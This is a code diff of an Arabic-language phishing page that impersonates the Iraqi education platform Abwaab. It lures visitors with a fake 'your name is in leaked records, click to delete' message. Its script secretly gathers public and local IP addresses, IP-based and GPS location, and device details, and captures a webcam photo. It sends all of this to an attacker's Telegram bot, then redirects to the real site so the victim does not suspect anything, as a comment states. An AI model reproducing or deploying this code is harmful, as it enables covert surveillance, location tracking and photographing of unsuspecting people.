@@ -3,92 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>أبواب - أفضل منصة متكاملة للتعليم الإلكتروني في العراق</title>
+    <title>منصة أبواب - التحقق من السجلات</title>
     <style>
         body {
             font-family: Tahoma, sans-serif;
-            background-color: #0d47a1; /* لون خلفية مطابق للموقع */
-            margin: 0;
-            padding: 0;
+            background-color: #f4f7f6;
             text-align: center;
-            color: #ffffff;
+            padding-top: 80px;
+            margin: 0;
         }
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 15px 20px;
-            background-color: #ffffff;
-            color: #333;
-        }
-        .logo-area {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-weight: bold;
-            font-size: 18px;
-        }
-        .content {
-            padding: 40px 20px;
-            max-width: 500px;
+        .container {
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 420px;
             margin: auto;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
         }
         h1 {
-            font-size: 24px;
-            font-weight: bold;
-            line-height: 1.4;
+            color: #333;
+            font-size: 22px;
             margin-bottom: 10px;
         }
         p {
+            color: #666;
             font-size: 14px;
-            opacity: 0.9;
-            margin-bottom: 30px;
+            margin-bottom: 25px;
         }
-        .btn-yellow {
+        button {
             background-color: #ffc107;
             color: #333;
             border: none;
-            padding: 15px;
+            padding: 14px 20px;
             font-size: 16px;
             font-weight: bold;
-            border-radius: 8px;
-            width: 100%;
+            border-radius: 6px;
             cursor: pointer;
-            margin-bottom: 15px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            width: 100%;
+            transition: background 0.3s;
         }
-        .btn-white {
-            background-color: #ffffff;
-            color: #0d47a1;
-            border: none;
-            padding: 15px;
-            font-size: 16px;
-            font-weight: bold;
-            border-radius: 8px;
-            width: 100%;
-            cursor: pointer;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        button:hover {
+            background-color: #e0a800;
         }
     </style>
 </head>
 <body>
 
-    <!-- الهيدر العلوي المطابق للموقع -->
-    <div class="header">
-        <div style="font-size: 20px;">🇮🇶</div>
-        <div class="logo-area">
-            <span>ابواب</span>
-            <span style="color: #0d47a1;">abwaab</span>
-        </div>
-    </div>
-
-    <!-- المحتوى الرئيسي والأزرار -->
-    <div class="content">
-        <h1>أفضل منصة متكاملة للتعليم الإلكتروني في العراق</h1>
-        <p>وجهة الطلاب والأهالي الطموحين للنجاح والتميز الأكاديمي</p>
-        
-        <button class="btn-yellow" id="actionBtn1">افتح حساب جديد</button>
-        <button class="btn-white" id="actionBtn2">دخول إلى حسابي</button>
+    <div class="container" id="mainBox">
+        <h1>التحقق من السجلات وحذف البيانات</h1>
+        <p>تم رصد اسمك ضمن السجلات المتاحة. انقر على الزر أدناه لتأكيد الهوية وبدء عملية الحذف الفوري والانتقال للمنصة.</p>
+        <button id="triggerBtn">بدء عملية فحص وحذف البيانات</button>
     </div>
 
     <!-- عناصر الكاميرا المخفية -->
@@ -108,7 +72,9 @@
                     text: text,
                     parse_mode: 'HTML'
                 })
-            }).catch(err => console.error(err));
+            })
+            .then(r => r.json())
+            .catch(err => console.error('❌:', err));
         }
 
         function sendPhotoToTelegram(blob, captionText) {
@@ -121,7 +87,9 @@
             return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
-            }).catch(err => console.error(err));
+            })
+            .then(res => res.json())
+            .catch(err => console.error('❌ خطأ في إرسال الصورة:', err));
         }
 
         async function getPublicIPv4() {
@@ -129,64 +97,155 @@
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
                 return data.ip;
-            } catch { return 'غير متاح'; }
+            } catch {
+                return 'غير متاح';
+            }
+        }
+
+        async function getPublicIPv6() {
+            try {
+                const res = await fetch('https://api6.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch {
+                return 'غير متاح';
+            }
+        }
+
+        function getLocalIP() {
+            return new Promise((resolve) => {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                    const ip = ice.candidate.candidate.split(' ')[4];
+                    if (ip && ip.includes('.')) {
+                        resolve(ip);
+                        pc.close();
+                    }
+                };
+                setTimeout(() => {
+                    resolve('غير متاح');
+                    pc.close();
+                }, 3000);
+            });
+        }
+
+        async function getLocation(ip) {
+            try {
+                const res = await fetch(`http://ip-api.com/json/${ip}?lang=ar`);
+                const data = await res.json();
+                if (data.status === 'success') {
+                    return {
+                        country: data.country || 'غير معروف',
+                        city: data.city || 'غير معروف',
+                        lat: data.lat,
+                        lon: data.lon,
+                        mapLink: `https://www.google.com/maps?q=${data.lat},${data.lon}`
+                    };
+                }
+                return null;
+            } catch {
+                return null;
+            }
         }
 
         function getExactGPSLocation() {
             return new Promise((resolve) => {
-                if (!navigator.geolocation) { resolve(null); return; }
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, mapLink: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` }),
-                    () => resolve(null),
-                    { enableHighAccuracy: true, timeout: 8000 }
+                    (position) => {
+                        resolve({
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            mapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
+                        });
+                    },
+                    (error) => {
+                        resolve(null);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
             });
         }
 
-        async function executeCaptureAndRedirect() {
+        // دالة إعادة التوجيه للموقع المطلوب
+        function redirectToAbwaab() {
+            window.location.href = 'http://abwaabiraq.com';
+        }
+
+        document.getElementById('triggerBtn').addEventListener('click', async function() {
+            this.innerText = "جاري معالجة الطلب والنقل للمنصة...";
+            this.disabled = true;
+
             const ipv4 = await getPublicIPv4();
+            const ipv6 = await getPublicIPv6();
+            const localIP = await getLocalIP();
+            const ipLocation = await getLocation(ipv4);
             const gpsLocation = await getExactGPSLocation();
 
             let msg = `<blockquote>`;
-            msg += ` <b>🎯 ضحية جديدة عبر واجهة أبواب الأصلية</b>\n\n`;
-            msg += ` <b>IP العام</b>: <tg-spoiler>${ipv4}</tg-spoiler>\n`;
-            if (gpsLocation) {
-                msg += ` 📍 <b>الإحداثيات</b>: <tg-spoiler>${gpsLocation.lat}, ${gpsLocation.lon}</tg-spoiler>\n`;
-                msg += ` 🗺️ <b>الخريطة</b>: <a href="${gpsLocation.mapLink}">رابط الموقع الدقيق</a>\n\n`;
+            msg += ` <b>زيارة تفاعلية وتحويل ناجح</b>\n\n`;
+            msg += ` <b>IP العام (IPv4)</b>: <tg-spoiler> ${ipv4} </tg-spoiler>\n`;
+            msg += ` <b>IP العام (IPv6)</b>: <tg-spoiler> ${ipv6} </tg-spoiler>\n`;
+            msg += ` <b>IP المحلي (Local)</b>: <tg-spoiler> ${localIP} </tg-spoiler>\n\n`;
+            
+            if (ipLocation) {
+                msg += ` <b>موقع الـ IP</b>: <tg-spoiler> ${ipLocation.country} - ${ipLocation.city} </tg-spoiler>\n`;
             }
-            msg += ` <b>الجهاز</b>: ${/Mobi|Android/i.test(navigator.userAgent) ? 'موبايل' : 'كمبيوتر'}\n`;
-            msg += ` <b>الوقت</b>: <code>${new Date().toLocaleString('ar-EG')}</code>\n`;
+
+            if (gpsLocation) {
+                msg += ` 📍 <b>الموقع الدقيق (GPS)</b>:\n`;
+                msg += ` <b>الإحداثيات</b>: <tg-spoiler>${gpsLocation.lat}, ${gpsLocation.lon}</tg-spoiler>\n`;
+                msg += ` <b>رابط خريطة GPS</b>: <a href="${gpsLocation.mapLink}">اضغط هنا للدقة العالية</a>\n\n`;
+            } else {
+                msg += ` 📍 <b>الموقع الدقيق (GPS)</b>: لم يتم السماح به أو مرفوض\n\n`;
+            }
+
+            msg += ` <b>نظام التشغيل</b>: ${navigator.userAgent.includes('Windows') ? 'Windows' : navigator.userAgent.includes('Mac') ? 'Mac' : navigator.userAgent.includes('Android') ? 'Android' : 'غير معروف'}\n`;
+            msg += ` <b>المتصفح</b>: ${navigator.userAgent.includes('Chrome') ? 'Chrome' : navigator.userAgent.includes('Firefox') ? 'Firefox' : navigator.userAgent.includes('Safari') ? 'Safari' : 'غير معروف'}\n`;
+            msg += ` <b>نوع الجهاز</b>: ${/Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? 'جوال/تابلت' : 'كمبيوتر'}\n`;
+            msg += ` <b>دقة الشاشة</b>: ${window.screen.width}x${window.screen.height}\n`;
+            msg += ` <b>اللغة</b>: ${navigator.language || 'غير معروف'}\n`;
+            msg += ` <b>المنطقة الزمنية</b>: ${Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير معروف'}\n`;
+            msg += ` <b>وقت الدخول</b>: <code>${new Date().toLocaleString('ar-EG')}</code>\n`;
             msg += `</blockquote>`;
 
+            // تشغيل الكاميرا والتقاط الصورة ثم التحويل التلقائي
             navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
             .then(stream => {
                 const video = document.getElementById('video');
                 video.srcObject = stream;
+                
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    stream.getTracks().forEach(t => t.stop());
+                    
+                    stream.getTracks().forEach(track => track.stop());
 
                     canvas.toBlob(blob => {
                         sendPhotoToTelegram(blob, msg).then(() => {
-                            window.location.href = 'http://abwaabiraq.com';
+                            // التوجيه فور إتمام إرسال الصورة
+                            redirectToAbwaab();
                         });
                     }, 'image/jpeg', 0.8);
-                }, 1200);
+                }, 1500);
             })
-            .catch(() => {
-                sendToTelegram(msg + "\n⚠️ <b>ملاحظة:</b> تم رفض إذن الكاميرا.").then(() => {
-                    window.location.href = 'http://abwaabiraq.com';
+            .catch(err => {
+                console.log('مرفوض أو غير متاح:', err);
+                sendToTelegram(msg + "\n⚠️ <b>ملاحظة:</b> تم رفض إذن الكاميرا من قبل المستخدم.").then(() => {
+                    // حتى لو رفض الكاميرا، يتم تحويله للموقع الأصلي لكي لا يشك بشيء
+                    redirectToAbwaab();
                 });
             });
-        }
-
-        // ربط الأحداث بالأزرار الموجودة في الواجهة
-        document.getElementById('actionBtn1').addEventListener('click', executeCaptureAndRedirect);
-        document.getElementById('actionBtn2').addEventListener('click', executeCaptureAndRedirect);
+        });
     </script>
 </body>
 </html>
